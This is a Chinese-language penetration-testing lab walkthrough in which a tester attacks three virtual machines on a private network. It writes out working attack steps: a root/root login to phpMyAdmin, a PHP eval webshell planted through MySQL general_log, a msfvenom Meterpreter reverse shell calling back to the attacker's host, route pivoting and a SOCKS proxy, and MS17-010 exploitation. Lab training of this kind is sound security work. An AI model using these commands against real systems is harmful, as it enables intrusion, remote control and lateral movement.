网络拓扑结构如下：



虚拟机共3台，分别为Win7、Win2003和Win2008：


Win7配置2块网卡，主网卡配置“桥接模式”（为了让局域网其它机器可以正常访问），添加另一块网卡，配置在vnet2中


Win2003、Win2008两台虚拟机网卡全部配置在vnet2中


启动3台虚拟机后，Win7虚拟机启动phpstudy，局域网其它机器通过访问http://172.31.10.154，顺利看到phpstudy页面即表示OK。


通过目录扫描，发现http://172.31.10.154/phpmyadmin，通过弱口令root/root登录，发现日志为关闭状态：




可通过：

set global general_log = on

‍


将全局日志功能开启，然后设置日志保存路径：


set global general_log_file = 'C:/phpStudy/WWW/kuhnshell.php'


写入一句话木马：


SELECT '<?php eval($_POST[pass]);?>'


接着尝试使用蚁剑之类的webshell管理工具连接，成功：



Metasploit生成反连shell：


# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.31.10.150 LPORT=1337  -f exe -o  kuhnshell.exe


从蚁剑中上传该shell，Metasploit设置反连监听：


# use exploit/multi/handler# set payload windows/meterpreter/reverse_tcp# set LHOST 172.31.10.150# set LPORT 1337# run


蚁剑终端中运行kuhnshell.exe，如果成功的话，即可看到成功过获得反连shell：



利用meterpreter探测内网信息：


meterpreter > run get_local_subnets //获取网段meterpreter > run autoroute -s 192.168.52.0/24 //添加路由meterpreter > run autoroute -p //查看路由meterpreter > run autoroute -d -s 192.168.52.0 //删除网段meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.52.0/24 //探测该网段下的存活主机。meterpreter > background //后台sessions


这里有个坑：更新Metasploit后，meterpreter的script已被弃用，需要如下使用：

 use post/multi/manage/autoroute# set subnet 192.168.52.0# set session 1# set cmd add# run


将kali设置为sock代理：


# use auxiliary/server/proxy_server# set srvhost 172.31.10.150  //172.31.10.150为kali主机的IP地址# run

注：如果需要停掉代理，使用以下命令：

jobskill x


然后修改proxychains配置文件：


# vim /etc/proxychains.conf


将sock4a一行注释掉，然后在下方增加一条：

socks5 172.31.10.150 1080


设置代理，即可访问192.168.52段的内网IP：

SwitchyOmega 设置：



访问192.168.52.138，如果出现IIS7图片，表示内网代理连接成功：



也可通过proxychains对内网相应主机进行渗透：


# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms17-010.nse 192.168.52.141


可以看到141这台主机存在17-010漏洞：



然后可以使用Metasploit尝试17-010渗透：


msf6> search ms17-010msf6> use exploit/windows/smb/ms17_010_psexecmsf6> set payload windows/meterpreter/bind_tcpmsf6> set rhost 192.168.52.141msf6> run
